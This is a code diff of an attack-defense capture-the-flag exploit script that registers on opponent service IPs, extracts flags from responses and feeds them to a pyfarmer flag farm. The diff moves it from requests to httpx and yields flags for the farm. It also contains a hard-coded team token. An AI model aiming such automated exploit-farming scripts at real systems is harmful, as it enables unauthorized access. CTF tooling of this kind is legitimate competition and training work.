@@ -1,13 +1,13 @@
-from requests import Session
+from httpx import Client
 from pwn import remote
-from pyfarmer import random_string, farm, submit_flag
+from pyfarmer import random_string, farm
 
 TEAM_TOKEN = "30351a6a5a8233465c09494d9652761d"
 HEADERS = {"X-Team-Token": TEAM_TOKEN}
 
 
-def main(ip: str) -> None:
-    session = Session()
+def main(ip: str):
+    session = Client()
     auth = random_string()
     session.post(
         f"http://{ip}/register",
@@ -44,8 +44,8 @@ def main(ip: str) -> None:
         data={"flag": flag, "team": "Nop_Team", "service": 1, "submit": "Send"},
     )
     real_flag = res.text.split("some points: ")[1].split(" ")[0]
-    submit_flag(real_flag)
+    yield real_flag
 
 
 if __name__ == "__main__":
-    farm(main, __file__)
+    farm(main)
